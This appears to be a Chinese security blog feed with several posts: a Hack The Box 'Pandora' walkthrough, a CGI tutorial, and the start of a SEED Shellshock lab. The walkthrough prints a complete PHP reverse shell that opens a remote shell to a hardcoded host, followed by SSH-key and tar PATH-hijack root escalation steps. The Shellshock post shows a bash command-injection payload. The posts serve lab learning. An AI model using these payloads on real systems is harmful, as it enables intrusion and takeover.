class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line"><span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$num_changed_sockets</span> = stream_select(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div></div>我们只需要改变ip和所监听的端口即可，之后上传并访问该文件，我们便可以得到matt用户的shell。<h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><code>find / -perm -u=s 2&gt; /dev/null</code>：找到主机上面具有setuid权限的文件。<br><img src="https://s2.loli.net/2022/01/31/k46yLFl5ozcUmuT.png" alt="image.png"><br>发现<code>/usr/bin/pandora_backup</code>是用来进行备份的可执行文件，运行一下。直接运行<code>sudo /usr/bin/pandora_backup</code>发现报错，查看别人文章说是shell的问题，可以通过ssh获取一个更加稳定的shell。<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><code>ssh-keygen</code>：创建公钥和私钥，passphrase可以不输入直接Enter不设置密码。<br><code>cat id_rsa.pub &gt;&gt; authorized_keys</code>：将生成的公钥加入到授权登录的列表里面。<br><code>chmod 600 authorized_keys</code>：更改权限。<br>在自己的主机上执行如下步骤：<br><code>touch id_rsa</code>：将该密钥放入到本地的一个文件中，作者创建了<em>id_rsa</em>。<br><code>chmod 600 id_rsa</code>：更改权限。<br><code>ssh matt@10.10.11.136 -i ./id_rsa</code>：通过本地<em>id_rsa</em>密钥文件以matt身份登录。<h3 id="setuid文件的利用"><a href="#setuid文件的利用" class="headerlink" title="setuid文件的利用"></a>setuid文件的利用</h3><code>python3 -m http.server 18000</code>在靶机上开启一个服务器，来把<em>pandora_backup</em>文件下载到本地进行调试。<br><code>gdb ./pandora_backup</code>启动调试。<br><img src="https://s2.loli.net/2022/01/31/65QloRWtiT1xKcn.png" alt="image.png"><br>发现调用了tar进行备份，所以我们可以在环境变量中插入我们自己的tar可执行文件路径。<br><code>echo &quot;/bin/bash&quot; &gt; tar</code><br><code>chmod +x ./tar</code><br><code>PATH=&quot;/home/matt&quot;:$&#123;PATH&#125;</code>：将我们的tar可执行文件的路径作为最先匹配的路径，命令的匹配是按环境变量所包含路径的顺序查找的。<br>最后执行<code>/usr/bin/pandora_backup</code>便可以获得root shell。<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><a href="https://zhuanlan.zhihu.com/p/458926451">https://zhuanlan.zhihu.com/p/458926451</a><br><a href="https://brainful.blog/2022/01/19/enumeration-2/">https://brainful.blog/2022/01/19/enumeration-2/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGI学习</title>
      <link href="/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CGI(Common Gateway Interface)严格来说是一个协议标准，不管是什么编程语言，只要符合该标准的规则就可以被称为CGI程序或者CGI脚本。<br>CGI是为Web服务器产生动态内容而创造的。在该标准出现前服务器所提供的都是静态内容，也就是存储在磁盘上面的文件，服务器在收到请求后直接将磁盘文件内容发送给客户端。而CGI出现之后，服务器就可以与后端的数据库进行交互。</p><h1 id="CGI工作原理"><a href="#CGI工作原理" class="headerlink" title="CGI工作原理"></a>CGI工作原理</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart TB    浏览器--HTTP请求&#x2F;cgi-bin&#x2F;hello.py--&gt;B[服务器]    B--HTTP响应--&gt;浏览器    B--调用并传递参数--&gt;C[CGI程序]    C--返回执行结果--&gt;B    C--请求--&gt;D[数据库]    D--响应--&gt;C  </pre></div><p>首先通过向浏览器中输入URL来向服务器请求CGI程序并传入参数。服务器在知道客户端要访问CGI程序后，会先fork一个新的shell进程然后运行/cgi-bin/hello.py这个CGI程序，CGI程序可以与后端的数据库进行一些交互并将最终的结果返回给服务器，服务器再发送给客户端。<br>这是一个大致的工作流程，但是其中有几个问题需要解决。服务器如何将参数传递给子进程？服务器如何将其他信息传递给子进程?CGI的执行结果如何返回给客户端？</p><ol><li>服务器会将URL后面跟随的参数赋值给环境变量<code>QUERY_STRING</code>，环境变量会传递给子进程，这样子进程便也可以访问传进来的参数。</li><li>服务器其他的一些信息，比如监听的端口、客户端IP地址等，同样的也会赋值给相应的环境变量并传递给子进程。</li><li>在子进程加载并运行CGI程序前，服务器会将标准输出重定向到与客户端相关联的套接字描述符，这样就会将输出的内容发送给客户端。需要注意的一点是，内容类型<code>Content-type</code>和长度<code>Content-length</code>都需要子进程来进行设置。<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2>接下来通过一个Apache服务器的例子来进一步说明工作的原理。<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">apache:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">httpd:2.4</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;18008:80&quot;</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;./:/tmp&quot;</span></span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3>开启Apache服务器的CGI，修改apache的配置文件conf目录下的httpd.conf。</li></ol><ul><li>注释掉<code>LoadModule cgid_module modules/mod_cgid.so</code>来加载CGI模块。</li><li><code>ScriptAlias &quot;/cgi-bin/&quot; &quot;/usr/local/apache2/cgi-bin/&quot;</code>将存放CGI程序的目录与URL访问路径映射起来，每当访问该路径时，服务器就会将所访问的文件视为CGI程序并尝试去执行。</li><li><code>AddHandler cgi-script .cgi .py</code>除了告诉服务器CGI程序存放的目录外，还要告诉服务器什么后缀的文件也应该被视为CGI程序。</li><li>在服务器目录下执行<code>bin/apachectl restart</code>来重启服务器加载配置文件。<br>更多的配置信息可以参考<a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">官方链接</a><h3 id="CGI程序"><a href="#CGI程序" class="headerlink" title="CGI程序"></a>CGI程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;h1&gt;Hello from server!&lt;h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>C语言编写的一个简单的CGI程序。与之前描述的一样，我们需要先设置必要的部分，这里设置了MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）为html，并且按照格式以一个新的空行标志响应报头的结束，后面跟上响应主体也就是我们想要发送的信息。<h3 id="访问CGI程序"><a href="#访问CGI程序" class="headerlink" title="访问CGI程序"></a>访问CGI程序</h3>浏览器输入<code>http://ip:18008/cgi-bin/hello</code>来访问编译好的CGI程序。<br><img src="https://s2.loli.net/2022/01/25/DuIAoMG9CQlOT71.png" alt="image.png"><br>服务器成功地返回了信息。<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1>CGI是一个很古远的技术了，现在的前后端界限已经没有那么清晰了，比如Node.js是一个基于JavaScript的运行时环境而JavaScript本身属于前端语言的范畴。但是学习一下CGI可以帮助我们理解前后端以及Web服务器之间是如何进行交互的，这样当我们在学习一些更加复杂的技术时可以帮助我们更快的入门。<br>接下来计划继续完善该文章，介绍一些CGI的改进版本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> Web服务器 </category>
          
          <category> CGI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> 动态内容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seedlab-Shellshock</title>
      <link href="/2022/01/23/shellshock/"/>
      <url>/2022/01/23/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shellshock是于2014年发现与bash相关的漏洞，漏洞原因是因为bash在解析函数变量时所调用的解析函数，会将<strong>分号</strong>隔开的语句当作指令而执行，从而造成命令执行。<br><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">本实验原地址</a></p><h1 id="Web服务器与CGI"><a href="#Web服务器与CGI" class="headerlink" title="Web服务器与CGI"></a>Web服务器与CGI</h1><p>许多的Web服务器（Apache和nginx等）开启了CGI，来为web应用生成动态的内容。许多的CGI程序是shell脚本，所以在CGI程序运行前，Web服务器会首先fork一个新的shell程序并将HTTP请求中的一些内容设置为环境变量引入，需要用户进行HTTP请求来触发该CGI程序。<br>需要补充一点的是，CGI程序不仅可以是shell脚本，其他的一些可以接收输入的编程语言比如php等，也可以作为CGI程序来进行解析。</p><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><h2 id="熟悉shell函数"><a href="#熟悉shell函数" class="headerlink" title="熟悉shell函数"></a>熟悉shell函数</h2><p>Ubuntu20.04中的bash程序已经被修复，无法再实施攻击。该实验在虚拟机的<mark class="hl-label blue">/bin</mark> 和压缩包的<mark class="hl-label blue">image_www</mark> 目录下安装了一个存在漏洞的bash程序。</p><h3 id="编写一个存在漏洞的shell函数"><a href="#编写一个存在漏洞的shell函数" class="headerlink" title="编写一个存在漏洞的shell函数"></a>编写一个存在漏洞的shell函数</h3><p>正常情况下shell函数的编写：<br><code>foo() &#123; echo &quot;hello world!&quot;; &#125;</code></p><mark class="hl-label red">注意：</mark> 左大括号后面的空格不能丢。<p><code>declare -f foo</code>来输出定义的函数<br>通过直接在shell中输入函数名字即可调用。<br><code>unset -f foo</code>删除定义的函数<br>另一种shell函数的编写方法：<br>上一种方法编写的shell函数如果想要传入子进程,则需要执行<code>export -f foo</code>,也就是将export的函数定义作为环境变量传入子进程。这种方法的缺点就是，父进程必须是shell程序否则无法将函数转化为环境变量引入子进程。<br>还有一种方法是定义一个特殊的变量，如<code>foo=&#39;() &#123; echo &quot;hello world!&quot;; &#125;&#39;</code>，<strong>左大括号左右间的空格不能丢掉</strong>。然后将该变量作为环境变量引入子bash进程<code>export foo</code>，子进程的shell程序会将环境变量转换为它自己的shell变量，如果在转换过程中发现有以<code>() &#123;</code>开头的环境变量时，则会将其转换为shell函数。这样只需要通过一个环境变量即可以传递函数定义。<br>定义一个存在漏洞的shell函数：<br>第二种方法在将环境变量解析为函数时会解析并执行<code>;</code>分隔的shell命令。<br><code>hack=&#39;() &#123; echo &quot;bad shell func!;&quot;&#125;;echo &quot;hacker!\n&quot;&#39;</code><strong>注意分号</strong><br><img src="https://s2.loli.net/2022/01/22/MxNuOp7ef8QKFqD.png" alt="image.png"><br>不同bash的结果如上图所示。</p><h2 id="通过环境变量向bash传入数据"><a href="#通过环境变量向bash传入数据" class="headerlink" title="通过环境变量向bash传入数据"></a>通过环境变量向bash传入数据</h2><div class="note primary simple"><p>Shellshock如果需要成功，需要满足以下两个条件：<br>1.触发bash调用<br>2.将用户输入作为环境变量</p></div><p>方便查看环境变量的CGI程序<mark class="hl-label blue">getenv.cgi</mark> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash_shellshock</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure><p><code>$$</code>会被替换为当前的进程ID</p><h3 id="使用浏览器"><a href="#使用浏览器" class="headerlink" title="使用浏览器"></a>使用浏览器</h3><div class="hide-toggle" ><div 